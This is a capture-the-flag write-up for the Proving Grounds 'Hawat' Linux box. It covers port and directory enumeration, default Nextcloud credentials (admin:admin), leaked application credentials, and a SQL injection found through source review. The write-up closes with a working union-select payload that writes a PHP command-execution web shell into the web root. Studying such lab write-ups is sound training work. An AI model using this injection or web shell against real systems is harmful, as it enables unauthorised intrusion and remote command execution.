# Hawat

## Introduction

Hawat is an offensive security proving grounds linux box rated as 'warm up' category.

## Enumeration

### Nmap

Nmap scan of all tcp ports.  

```
22/tcp    open   ssh          syn-ack ttl 61 OpenSSH 8.4 (protocol 2.0)
17445/tcp open   unknown      syn-ack ttl 61
30455/tcp open   http         syn-ack ttl 61 nginx 1.18.0
50080/tcp open   http         syn-ack ttl 61 Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
```

### Searchsploit

nginx 1.18.0 shows no known vulnerabilities.  
apache 2.4.46 shows no known vulnerabilities.  

### HTTP 17445

After browsing the webpage of the issue tracker, two directories and a main.js file can be found.  

```
/login
/register
```

Contained in the javascript file main.js is functionality suggesting an api.  

```
urlbase+'/delete/'+id
urlbase+'/list'
```

When looking around the site, I encounter an error page which after researching suggests spring boot.  

Username found after registering an account.  

`clinton`

### HTTP 50080

Webpage is an index.html powered by w3.css. Italian restaurant pizza business.  

Directory found in the html source code.  

```
/4/w3.css
/images/pizza.jpg
```

Directory scan with common.txt  

```
+ http://192.168.224.147:50080/~bin (CODE:403|SIZE:980)                                                                                                                                                           
+ http://192.168.224.147:50080/~ftp (CODE:403|SIZE:980)                                                                                                                                                           
+ http://192.168.224.147:50080/~http (CODE:403|SIZE:980)                                                                                                                                                          
+ http://192.168.224.147:50080/~mail (CODE:403|SIZE:980)                                                                                                                                                          
+ http://192.168.224.147:50080/~nobody (CODE:403|SIZE:980)                                                                                                                                                        
+ http://192.168.224.147:50080/~root (CODE:403|SIZE:980)                                                                                                                                                          
==> DIRECTORY: http://192.168.224.147:50080/4/                                                                                                                                                                    
+ http://192.168.224.147:50080/cgi-bin/ (CODE:403|SIZE:994)                                                                                                                                                       
==> DIRECTORY: http://192.168.224.147:50080/images/                                                                                                                                                               
+ http://192.168.224.147:50080/index.html (CODE:200|SIZE:9088)
```

Directory found with raft large directories.

`cloud`

Web application nextcloud login page found under the cloud directory.  

When trying credentials for nextcloud, the following were successful.  

`admin:admin`

Found issue tracker Java source code in the cloud repo, default issue tracker user credentials.  

```
username: issue_user
password: ManagementInsideOld797
```

## SQL injection

On review of the source code, there was custom code not integrated into the JPA.  
This custom code used get parameter input directly in the query.  

`/issue/checkByPriority`

With the request parameter.  

`priority`

SQL query in the source code.  

`select message FROM issue WHERE priority='"+priority+"'`


Finding the web root '/srv/http' in phpinfo.php on port 30455, the following injection can provide a webshell after being urlencoded.  

`' union select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile '/srv/http/cmd.php' -- -`  

## Root

The web application was owned by root so no priv esc was needed.


